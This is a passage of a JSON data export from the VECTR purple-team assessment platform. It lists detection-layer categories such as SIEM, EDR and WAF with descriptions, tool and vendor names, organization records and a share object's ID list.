platform.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--0eaac669-7d11-4397-8011-a9cce6e577be","vectrId":"0eaac669-7d11-4397-8011-a9cce6e577be","createTime":1.480624083E12,"updateTime":1.54836976433E12,"offset":0,"name":"Email Gateway","description":"Includes on-premise and cloud-based mail gateways, in addition to next-gen secure mail gateway products.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--187fbad5-3728-42bd-bedc-42098c7eb167","vectrId":"187fbad5-3728-42bd-bedc-42098c7eb167","createTime":1.548441156869E12,"updateTime":1.548441311077E12,"offset":0,"name":"Threat Intelligence","description":"Includes open source and commercial threat intel feeds, indicators, and dedicated solutions for threat intel gathering and monitoring of company assets.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--2ff8b970-9742-4e81-9dd1-abe28518bb0b","vectrId":"2ff8b970-9742-4e81-9dd1-abe28518bb0b","createTime":1.480624083E12,"updateTime":1.506697057759E12,"offset":0,"name":"DLP","description":null,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--35edd968-3417-4bb0-a3a8-43a3e710b4fa","vectrId":"35edd968-3417-4bb0-a3a8-43a3e710b4fa","createTime":1.480624083E12,"updateTime":1.548369599712E12,"offset":0,"name":"Firewall","description":"Includes both traditional and \"next-gen\" firewall appliances.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--3e014b51-0a62-44ad-86a7-9f27a3128196","vectrId":"3e014b51-0a62-44ad-86a7-9f27a3128196","createTime":1.480624083E12,"updateTime":1.548368659326E12,"offset":0,"name":"IDS/IPS","description":"Includes more traditional network IDS/IPS alerting based on signatures, such as Snort and other tools that work similarly. IDS/IPS may also be covered under general Firewall category depending on the platform and modules enabled.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--45719f74-ccb0-41a4-8fdf-fef547c3ce3d","vectrId":"45719f74-ccb0-41a4-8fdf-fef547c3ce3d","createTime":1.548440727509E12,"updateTime":1.548440727509E12,"offset":0,"name":"CASB","description":"Cloud access security broker tools that provide visibility and policy enforcement between enterprise users and cloud services.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--4a35ec87-16cf-4c46-b083-f25df01e02f9","vectrId":"4a35ec87-16cf-4c46-b083-f25df01e02f9","createTime":1.548369992062E12,"updateTime":1.548369992062E12,"offset":0,"name":"SOAR","description":"Security Orchestration, Automation and Response (SOAR), includes platforms that integrate with various other security/IT tools and allows some form of automated IR through defined playbooks and flows.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","vectrId":"4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","createTime":1.480624084E12,"updateTime":1.480624084E12,"offset":0,"name":"FIM","description":null,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--512f7c46-b791-49bc-8afb-73d172bcc120","vectrId":"512f7c46-b791-49bc-8afb-73d172bcc120","createTime":1.548429697316E12,"updateTime":1.548429697316E12,"offset":0,"name":"Endpoint Forensics","description":"","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--54c70ef6-1e4a-4613-a99d-692230cb557a","vectrId":"54c70ef6-1e4a-4613-a99d-692230cb557a","createTime":1.480624083E12,"updateTime":1.548368761395E12,"offset":0,"name":"SIEM","description":"Security Incident and Event Management, on-premise or cloud-based solution.  Logs are ingested to SIEM platform from various OS, networking, and security tool sources for analysis, correlation, and alerting.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--61d3f883-72cd-4c57-8d84-545a5f34ac5c","vectrId":"61d3f883-72cd-4c57-8d84-545a5f34ac5c","createTime":1.480624083E12,"updateTime":1.548368808784E12,"offset":0,"name":"Network Isolation","description":"Includes NAC and network isolation solutions.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--6490f8d2-6bc1-4721-86c3-6244ac9f622e","vectrId":"6490f8d2-6bc1-4721-86c3-6244ac9f622e","createTime":1.506706423642E12,"updateTime":1.54997863899E12,"offset":0,"name":"IR Workflow","description":"IRW, integration, orchestration & alerting platforms","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--6d4984f9-9d79-4f21-a495-dd6fcd0ee363","vectrId":"6d4984f9-9d79-4f21-a495-dd6fcd0ee363","createTime":1.548369941031E12,"updateTime":1.548369941031E12,"offset":0,"name":"EDR (Hunting)","description":"Includes EDR tools/modules with primary focus on hunt capabilities.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--765c22af-e010-4b4d-9ba5-86e1ae6c916d","vectrId":"765c22af-e010-4b4d-9ba5-86e1ae6c916d","createTime":1.480624083E12,"updateTime":1.480624083E12,"offset":0,"name":"EDR","description":null,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--860cc9bc-4da2-4698-889b-e96cca9e4bf3","vectrId":"860cc9bc-4da2-4698-889b-e96cca9e4bf3","createTime":1.480624083E12,"updateTime":1.54836979325E12,"offset":0,"name":"Endpoint Protection","description":"Includes more traditional AV software and modern versions with some \"next-gen\" capabilities.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--8cf5dd9d-1745-4f3c-861b-8548abf4080c","vectrId":"8cf5dd9d-1745-4f3c-861b-8548abf4080c","createTime":1.480624083E12,"updateTime":1.548369651409E12,"offset":0,"name":"DAM","description":"Includes Database Activity Monitoring (DAM) tools or native methods to monitor DB activity such as DB audit trails or triggers.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--9309d503-0861-4923-8a9a-f4749113e9e7","vectrId":"9309d503-0861-4923-8a9a-f4749113e9e7","createTime":1.506715215387E12,"updateTime":1.548368856182E12,"offset":0,"name":"Secure Baselines","description":"Includes general OS hardening, software configurations, and network security policies, and other measures that prevent initial exploitation and privilege escalation attempts.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","vectrId":"9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","createTime":1.548369964E12,"updateTime":1.548369964E12,"offset":0,"name":"EDR (Managed)","description":"Includes EDR products with managed services and escalation, which may be add-on to an existing software platform or dedicated MDR service.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","vectrId":"9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","createTime":1.480624083E12,"updateTime":1.54836982527E12,"offset":0,"name":"Deception","description":"Includes honeypots, other possible deception tools and techniques.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--9e008dd9-fe16-4ac8-8a6f-e537f60238f1","vectrId":"9e008dd9-fe16-4ac8-8a6f-e537f60238f1","createTime":1.548369908965E12,"updateTime":1.548369908965E12,"offset":0,"name":"EDR (Blocking)","description":"Includes EDR tools with primary focus on blocking and automated IR response such as killing a process, etc.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--a0e7b7dc-aba2-4027-9357-89caed086b5d","vectrId":"a0e7b7dc-aba2-4027-9357-89caed086b5d","createTime":1.548435143016E12,"updateTime":1.548435143016E12,"offset":0,"name":"PIM","description":"Includes privileged identity management, vault solutions and credential rotation.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--a95575f5-124e-4bf4-8fe3-c19fc3506b8f","vectrId":"a95575f5-124e-4bf4-8fe3-c19fc3506b8f","createTime":1.509154517581E12,"updateTime":1.509154524828E12,"offset":0,"name":"DDoS Protection","description":"DDoS Protection","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--c6b0def0-a115-4677-85fa-a7f08359a5e2","vectrId":"c6b0def0-a115-4677-85fa-a7f08359a5e2","createTime":1.480624083E12,"updateTime":1.548368926854E12,"offset":0,"name":"Brand Monitoring","description":"Includes domain and OSINT monitoring services to detect phishing domain registration and potentially other pre-attack activity.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--ca2faec1-7837-45ec-b6bb-64e1705a0014","vectrId":"ca2faec1-7837-45ec-b6bb-64e1705a0014","createTime":1.486957098311E12,"updateTime":1.548431143775E12,"offset":0,"name":"Behavior Analytics","description":"Includes User and Entity Behavior Analytics (EUBA) and related tools to detect unusual user and system activity on the network.  These tools can detect a large variety of unknown behavior that deviates from the norm which may include large amounts of broadcast traffic, unusual connections to sensitive assets, large file transfers leaving the network, and custom insider threat scenarios.  These tools often have cloud connectors and integrations with many popular security tools and log formats.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","vectrId":"d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","createTime":1.480624084E12,"updateTime":1.54836967755E12,"offset":0,"name":"Network Forensics","description":"Includes tools that generally focus on network security monitoring and have deep packet inspection capabilities. These are typically more useful for forensics rather than proactive alerting.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","vectrId":"d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","createTime":1.480624083E12,"updateTime":1.548369699935E12,"offset":0,"name":"Application Control","description":"Includes endpoint software that provides full application control/whitelisting and privilege management capabilities.  In some cases these tools provide a more manageable interface that sits on top of native OS controls.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--d37784d0-0083-45b7-b332-d5eb9ee95ca6","vectrId":"d37784d0-0083-45b7-b332-d5eb9ee95ca6","createTime":1.480624083E12,"updateTime":1.548369723697E12,"offset":0,"name":"WAF","description":"Web Application Firewalls, including specialized vendors in this space, open source versions like mod_security, or add-on services from cloud hosting providers.","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--013894b0-22b0-49be-923e-7c66fe5184f1","vectrId":"013894b0-22b0-49be-923e-7c66fe5184f1","offset":0,"createTime":1.486486444083E12,"updateTime":1.509143744221E12,"name":"Manual Techniques","icon":"","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--058e6f79-4b72-4905-83d0-ac55f5889fc6","vectrId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","offset":0,"createTime":1.568997542631E12,"updateTime":null,"name":"Imported STIX data","icon":"","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--12a59183-1df8-4634-9734-1ad145a631f7","vectrId":"12a59183-1df8-4634-9734-1ad145a631f7","offset":0,"createTime":1.47647431E12,"updateTime":1.481730473805E12,"name":"Empire","icon":"","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--1e0579eb-d4eb-4c7b-8bc7-927a5e303cac","vectrId":"1e0579eb-d4eb-4c7b-8bc7-927a5e303cac","offset":0,"createTime":1.466260163E12,"updateTime":1.481730473809E12,"name":"Mimikatz","icon":null,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--9bc68f75-f3d5-4442-8a70-6a5532cc12b4","vectrId":"9bc68f75-f3d5-4442-8a70-6a5532cc12b4","offset":0,"createTime":1.466260163E12,"updateTime":1.481730473811E12,"name":"Cobalt Strike","icon":null,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--bbf62501-def0-4196-a9b1-939663513a3a","vectrId":"bbf62501-def0-4196-a9b1-939663513a3a","offset":0,"createTime":1.57357415141E12,"updateTime":null,"name":"Imported STIX data","icon":"","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--c0342108-c7a9-48dd-be26-23e96d4016b5","vectrId":"c0342108-c7a9-48dd-be26-23e96d4016b5","offset":0,"createTime":1.47094599E12,"updateTime":1.516300153182E12,"name":"Microsoft","icon":"","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--c22bf791-e645-4cb6-a193-adfce311213e","vectrId":"c22bf791-e645-4cb6-a193-adfce311213e","offset":0,"createTime":1.578425885447E12,"updateTime":null,"name":"Impacket","icon":"","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-vendor","id":"x-vectr-io-vendor--d9c391ce-45e2-426a-9851-c2f2ee8e052c","vectrId":"d9c391ce-45e2-426a-9851-c2f2ee8e052c","offset":0,"createTime":1.548449277458E12,"updateTime":null,"name":"Native Utilities","icon":"","deprecated":false,"deprecationTime":0.0,"tagIds":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-organization","id":"x-vectr-io-organization--1cf413ba-326a-4d18-979c-367eb1306f69","vectrId":"1cf413ba-326a-4d18-979c-367eb1306f69","offset":0,"createTime":1.547126945008E12,"updateTime":1.547774371964E12,"tagIds":[],"name":"Security Risk Advisors","abbreviation":"SRA","description":"Security Consulting","color":"","url":"https://securityriskadvisors.com/","members":[],"deprecated":false,"deprecationTime":0.0,"system":true,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-organization","id":"x-vectr-io-organization--92fa723f-7791-467f-8726-05d34d80f40f","vectrId":"92fa723f-7791-467f-8726-05d34d80f40f","offset":0,"createTime":1.547142551096E12,"updateTime":1.547142551096E12,"tagIds":[],"name":"MITRE","abbreviation":"MITRE","description":"The MITRE Corporation","color":"","url":"https://www.mitre.org","members":[],"deprecated":false,"deprecationTime":0.0,"system":true,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-organization","id":"x-vectr-io-organization--f1f60f50-6564-4ce4-a376-4e6d9bac8183","vectrId":"f1f60f50-6564-4ce4-a376-4e6d9bac8183","offset":0,"createTime":1.547210839186E12,"updateTime":1.547774540442E12,"tagIds":[],"name":"Red Canary","abbreviation":"Atomic Red Team","description":"Atomic Red Team creator/maintainer","color":"","url":"https://www.redcanary.com","members":[],"deprecated":false,"deprecationTime":0.0,"system":true,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39","type":"x-vectr-io-share","id":"x-vectr-io-share--aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","parentId":"e96b6291-3c3f-404a-b9ef-e274dcaf6f94","parentType":"x-vectr-io-assessmentgroup","comment":null,"vectrIdList":["e96b6291-3c3f-404a-b9ef-e274dcaf6f94","419a551a-9613-4d11-98dc-b788396d073c","5d89c3ba-8868-4a9a-887b-08c7cf68e93d","7a233627-7aac-4b3c-b6b3-1a515182d523","7ea0885d-ea9f-48cb-81bc-dd92b988845e","c45947f0-f51d-4969-981a-c063e3eaa7fa","eb1f72ce-785d-4166-a88b-dde615d02b25","f6b39134-e64a-430c-8010-7b4ca8ddd2a7","014ade14-a236-444e-8dbe-e546a77abc3c","0192211d-34a3-4891-a8cd-f48186e4d159","02604086-2109-4bd4-b5c5-a57758443210","035046a0-28da-42c8-bbdb-31f0c1d724e8","053f5440-1039-42e4-833c-a3f11706082f","0c77556a-a676-415f-b074-082f8a599cbd","0d2a8f98-2a70-4d0f-ac20-61a712cd8dca","0d60fc51-83a4-4b3b-89b3-76461616508a","0f2f5ac8-eaa2-4332-8bf3-60ecdc149354","16f9e590-f1ae-40d0-bf41-4531b1bbe01c","180734f8-fbcb-4806-a4ce-eb24e8b9053f","18e70126-c923-4dde-a95e-36b453056db0","190b2ae7-d56b-4e5e-98de-632e704b9d79","1a442053-fe82-4fcc-b553-471d6bfe470a","1d3c953f-e214-4674-9fd9-091f0aab9572","20194b36-e180-436d-a4f2-a61ab152f2de","20f661a5-3421-4036-88e0-ff423c618f21","20f68cab-24bf-4a15-8e45-b4dd82c56cde","27bfb2bf-9a13-4478-ad89-bf000aeaaafa","28e24300-48f3-4e48-a7fe-38f241927ca9","2ae04f18-b715-4480-a196-72c64b6dbb80","2b43d5fd-64f9-42d3-8a63-f81f3f163bc0","2d553472-cb1b-4d8d-ae68-ab9197bce3ab","2e88c6a0-8f84-4b54-8e23-726ca5eebda8","2ecb02e3-1f75-4a63-947c-4e20749cc88e","2f063fe2-70c1-4af7-9f12-038ecd1541d4","2f3aa0de-aec4-47d9-8203-e9b139f9ad3d","30cc13ed-680a-4352-a093-a38e616f81b2","31b17735-053e-48aa-a927-c81c3021a3f9","329d13b9-5a93-4d5d-ad48-a91e0e70d133","3705db78-0dd2-4696-abb0-4047dff98d0d","38a95266-6cda-4905-a5e7-96531e80619f","3988cd09-03b3-4736-8783-45262752f8d9","39d21839-f414-490f-8127-4821bfdd63c0","3d64be57-aa6c-41d2-9e96-c5ae0ccd3b8b","3da04da9-cac9-4131-8696-e114d9f21913","429df14a-4e41-4006-9b0f-cc53eed671a8","42fe048a-1369-4c1c-b967-bddb9810aa33","438e262a-3956-4b4b-a078-ca8b373e0e08","4459f509-74b3-4b68-8cca-7db67f579186","45034000-9d34-412f-8dec-4a84c13f922f","4526f1ed-fcf3-465d-8107-17579a737c6b","458b4bad-c81c-4b94-98a9-5dbfb752f486","47a87b6f-da68-4bdb-bb76-770ab510721b","4821ba7e-77b9-44de-9742-207e5824b6cd","4b442c7d-ee1f-494d-9339-3ed8fb9c7425","4c750490-533f-4a4e-9692-f972bf3eba64","4e2a015b-5dd6-4687-ada5-669e1b4d435d","4f007b9e-ccfd-472b-8a02-47094203d445","4f8cb780-ad75-4f7f-bd6e-7521dc5e8a9f","505e1f38-f0f4-47ed-9623-f62924efcdc3","562e74cf-7706-4bdb-80a2-04bbea023ddd","563395f2-fa47-4e62-8228-57597c8b0be5","5c3f612f-48cd-461b-842a-03e929ec13eb","5d2507a5-e378-4d9f-812d-9f4321f0c74d","5d854213-edf5-482f-8553-0918fe48b055","5e2bbd65-29b7-4b2c-998e-be4936032010","640e2742-7072-4018-84b9-529ff01a70c3","64a053d1-c1fc-45b1-9106-180c761a2bba","66090e66-8d9e-4f9a-a2a8-17c6982a9690","661b5f40-5d7d-447c-8fcc-8f0330518a17","6620452b-de4e-4fbc-b412-570473888796","66f94e80-7500-4982-973d-d898d1081041","67d252d4-5bba-4178-9577-704956b4ec38","6919446f-6708-4dc1-86d7-577e6cdd9ddd","6b1f369b-c979-4ba3-a2b7-e1793b1962be","6c002959-4493-43d6-995b-5d8522623389","6d096d28-7766-4e55-8ff5-4ffffc2faafb","6dbe13f5-af60-44aa-bc56-d6a4110a5b09","6dd6a02b-48a4-4837-876b-493c2df7510d","7073e478-de10-465e-92f1-3bc5d9e0461b","71de1618-2c48-4efb-ae78-d7ce79689915","73330084-c72e-4c86-ad5a-a5f7c331d154","74348829-cf4c-4399-b614-1d0f22fb8206","749baeab-e35c-4c6f-81ea-443a262920a4","74d26099-8215-4b4d-9666-55335cd82ab2","7a261492-9225-4f2e-a701-d90fbbb36369","7af27c8a-6b6f-4971-85aa-b7edc323fced","7b22dfac-430b-4053-9aa2-81b72098eb75","7c84d591-e5b9-4782-91ad-1c0277b59dc7","7ea0c6a7-ad49-4158-8f83-abe043fcf079","84ccc036-4973-4307-9eea-e55ba6672ce0","865bdbb6-01af-4b41-81d1-0ececa73d12d","86a3338b-8ce6-4dbc-a986-ce1b0e531d11","877b2c88-f656-4f7c-aed1-62bec99cef1b","88bfefb5-4817-4fcd-83dc-9b21b8b3bfb8","8c27541e-dcbe-4124-a260-280af66b1f59","8c7894f4-c52a-4e66-ab54-a0e837a0e7ec","935f84cb-1c15-4c8f-8808-01f5207c9958","936ee652-351e-4867-958d-13351620fbe6","993918e1-562c-40d5-89c6-08aa6beb2db2","9add6e28-32ef-4c6c-ad0a-4c7c89c24164","9b5c9d9e-ca62-44e7-9160-0f149f6ac05c","9ce03c18-1fc7-4e0e-80dd-dda6d3b1b7b9","9d2c89c9-89a0-4648-9280-7daf9447b9bf","9dbc2d02-e30d-404c-a800-f94cbbe59e9a","a00f5355-d55d-4939-b4ef-7cae2af33ae8","a049d416-50e4-4e3f-8b0e-0762351ad886","a0ff239f-7e96-4a30-83f1-7e8ff93d2dbe","a273ffd2-52a2-4e58-9648-1086faca3cc6","a4a28e1c-dce4-4446-a034-6d519d090c84","a4b954c8-e087-42c1-bd94-0957be7d4859","a62bfd0f-27b2-4842-8f1f-4725eb4fb6bb","a7204b51-aa53-43ae-8ab6-84d8583ba422","a7d170e9-e5be-488e-aa16-e8823245273d","a7f60114-a60b-4c67-ab26-1dfbd0a03fcf","a92806c4-f7eb-45e1-844b-c3147f1a7468","abce7871-5154-443b-b335-f2f73d35451b","ad166886-0882-43ba-8486-aca3fd00c554","b4ddc49c-9e18-483e-838a-dfcf82be47f4","b59010a2-74e0-4213-8e17-c1031c8e870d","b95f6beb-8a88-4b03-b985-38b6c8325a3a","bb8096ee-ae2e-4cd0-a695-7ac55c1eb143","bb93c10d-080c-467b-b7c4-e2de00711f2e","bc4e5a5e-59a3-4af2-b2d7-38156470e7ef","bfa0da58-81d7-426e-8e03-2edbdbe4720f","bfe9444d-c84d-4cf8-8565-97fc064a826b","c1f0bdc1-98f5-4b1c-94fc-c5f704a0b2a1","c3eaa505-9863-4542-bb38-6bd92f5b1a10","c493ba52-17e0-415a-aeed-398cff10c19f","c5570c4c-4845-478c-8dbf-456690d3faa7","c5735226-a0fc-4158-8f5b-aa6956749cd5","c7d3193f-2f3a-47bf-83b7-e858ba879036","c7e8d98a-fadb-4eb9-a375-99320e49f839","c956f7f1-246d-42fe-a455-edb15664590a","cce40ed8-2905-4ece-99b4-71986c6595f3","cdb631a7-190e-45a7-98df-0290259809b4","cf2406d8-6223-44ec-81d2-4ca870758129","d1cc8b6f-4b06-49ad-868a-5a8a1c0ec22c","d25e4869-2389-4d4f-a93d-8f8017c6a05d","d3ae2751-6155-4d20-9a3e-e1e4bc1bc187","d4506dae-2738-47c3-8582-5d5e94f984ed","d6dd145b-c7ae-4f79-bc07-179a012a7a07","d74a33c7-633e-449b-8eb8-c0d5c1d80e39","d96795c3-7a22-4876-8f98-5d32b02999b3","d979d988-8441-4093-b913-e593ba2bdf03","dbc0c5e1-97df-49a3-ae1f-ad7117613ddc","dcffc1f1-2aaa-4eb5-99b3-c55d3bcfbb41","dd31603d-099d-498e-813a-5286b60d8d1f","e151101a-09f5-4756-ab7a-681a50e106d2","e1554117-5884-4d3a-b11b-3fb497931d20","e1aebb2e-6f07-4018-ab8c-a9908511cb66","e1e76bbe-c4b2-4738-8f20-d55c9c0850b0","e20255b6-a143-4dea-949a-739438dc8e5b","e3cdbff7-e262-4eb2-bff1-74045eccff11","e3ee3c9e-